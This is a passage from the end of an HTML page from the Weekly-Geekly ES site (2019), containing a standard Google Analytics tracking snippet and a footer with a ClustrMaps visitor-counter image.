    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>